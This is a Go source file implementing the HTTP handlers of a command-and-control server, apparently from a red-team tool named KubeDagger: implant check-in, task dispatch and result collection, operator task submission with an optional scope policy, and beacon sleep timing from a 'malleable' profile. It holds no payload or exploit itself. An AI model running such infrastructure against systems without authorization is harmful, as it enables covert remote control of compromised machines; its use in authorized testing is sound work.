package c2server

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/events"
	"github.com/yasindce1998/KubeDagger/pkg/malleable"
	"github.com/yasindce1998/KubeDagger/pkg/scope"
)

// maxResultDetail truncates task output recorded in task_result events.
const maxResultDetail = 200

type Handlers struct {
	agents  *AgentRegistry
	tasks   *TaskQueue
	events  *events.Store
	scope   *scope.Scope
	profile *malleable.Profile
}

// HandlersOption configures optional Handlers behaviour. All options are
// nil-safe: a Handlers built without them behaves exactly like the legacy
// server.
type HandlersOption func(*Handlers)

// WithEvents records agent and task events into the given store.
func WithEvents(store *events.Store) HandlersOption {
	return func(h *Handlers) { h.events = store }
}

// WithScope enforces the given scope policy on task submission.
func WithScope(s *scope.Scope) HandlersOption {
	return func(h *Handlers) { h.scope = s }
}

// WithProfile drives checkin sleep intervals from the given malleable profile.
func WithProfile(p *malleable.Profile) HandlersOption {
	return func(h *Handlers) { h.profile = p }
}

func NewHandlers(agents *AgentRegistry, tasks *TaskQueue, opts ...HandlersOption) *Handlers {
	h := &Handlers{agents: agents, tasks: tasks}
	for _, opt := range opts {
		if opt != nil {
			opt(h)
		}
	}
	return h
}

func (h *Handlers) HandleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req CheckinRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" {
		http.Error(w, "missing agent_id", http.StatusBadRequest)
		return
	}

	h.agents.Checkin(req)

	h.recordEvent(events.Event{
		Type:    events.TypeAgentCheckin,
		AgentID: req.AgentID,
		Detail:  fmt.Sprintf("os=%s arch=%s", req.OS, req.Arch),
	})

	sleepInterval := int(DefaultBeaconInterval.Seconds())
	if h.profile != nil {
		sleepInterval = int(h.profile.NextSleep().Seconds())
	}

	resp := CheckinResponse{
		SleepInterval: sleepInterval,
		TasksPending:  h.tasks.HasPending(req.AgentID),
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(resp)
}

func (h *Handlers) HandleTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req TaskRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" {
		http.Error(w, "missing agent_id", http.StatusBadRequest)
		return
	}

	if _, ok := h.agents.Get(req.AgentID); !ok {
		http.Error(w, "unknown agent", http.StatusForbidden)
		return
	}

	task := h.tasks.Dequeue(req.AgentID)
	if task == nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNoContent)
		return
	}

	logrus.Debugf("dispatching task %s (%s) to agent %s", task.ID, task.Type, req.AgentID)

	resp := TaskResponse{
		TaskID:  task.ID,
		Type:    task.Type,
		Payload: task.Payload,
	}

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(resp)
}

// HandleSubmit is the operator-facing HTTP API route for queuing tasks. It
// enforces the configured scope policy (HTTP 400 on violation) before the
// task enters the queue.
func (h *Handlers) HandleSubmit(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<16))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req SubmitRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" {
		http.Error(w, "missing agent_id", http.StatusBadRequest)
		return
	}

	if req.Type == "" {
		http.Error(w, "missing type", http.StatusBadRequest)
		return
	}

	if _, ok := h.agents.Get(req.AgentID); !ok {
		http.Error(w, "unknown agent", http.StatusForbidden)
		return
	}

	if err := h.checkScope(string(req.Type), req.Payload); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	task := h.tasks.Enqueue(req.AgentID, req.Type, req.Payload)
	logrus.Debugf("task %s (%s) submitted for agent %s", task.ID, task.Type, req.AgentID)

	h.recordEvent(events.Event{
		Type:      events.TypeTaskSubmitted,
		AgentID:   req.AgentID,
		TaskType:  string(req.Type),
		Technique: req.Payload["name"],
		Payload:   req.Payload,
	})

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(SubmitResponse{TaskID: task.ID})
}

func (h *Handlers) HandleResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(io.LimitReader(r.Body, 1<<20))
	if err != nil {
		http.Error(w, "read error", http.StatusBadRequest)
		return
	}

	var req ResultRequest
	if err := json.Unmarshal(body, &req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if req.AgentID == "" || req.TaskID == "" {
		http.Error(w, "missing agent_id or task_id", http.StatusBadRequest)
		return
	}

	if _, ok := h.agents.Get(req.AgentID); !ok {
		http.Error(w, "unknown agent", http.StatusForbidden)
		return
	}

	h.tasks.Complete(req.TaskID, req.Output, req.Error)
	logrus.Infof("task %s completed by agent %s (status: %s)", req.TaskID, req.AgentID, req.Status)

	taskType := ""
	technique := ""
	if task, ok := h.tasks.Get(req.TaskID); ok {
		taskType = string(task.Type)
		technique = task.Payload["name"]
	}

	h.recordEvent(events.Event{
		Type:      events.TypeTaskResult,
		AgentID:   req.AgentID,
		TaskType:  taskType,
		Status:    string(req.Status),
		Detail:    truncate(req.Output, maxResultDetail),
		Technique: technique,
	})

	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(ResultResponse{Ack: true})
}

// checkScope enforces the configured scope policy on a task submission. It
// returns nil when no policy is configured.
func (h *Handlers) checkScope(taskType string, payload map[string]string) error {
	if h.scope == nil {
		return nil
	}
	if err := h.scope.CheckTask(taskType, payload); err != nil {
		return fmt.Errorf("task rejected by scope policy: %v", err)
	}
	return nil
}

// recordEvent appends an event to the configured store. Recording failures
// are logged at warn level and never fatal.
func (h *Handlers) recordEvent(e events.Event) {
	if h.events == nil {
		return
	}
	if err := h.events.Record(e); err != nil {
		logrus.Warnf("failed to record %s event: %v", e.Type, err)
	}
}

// truncate returns the first n bytes of s.
func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
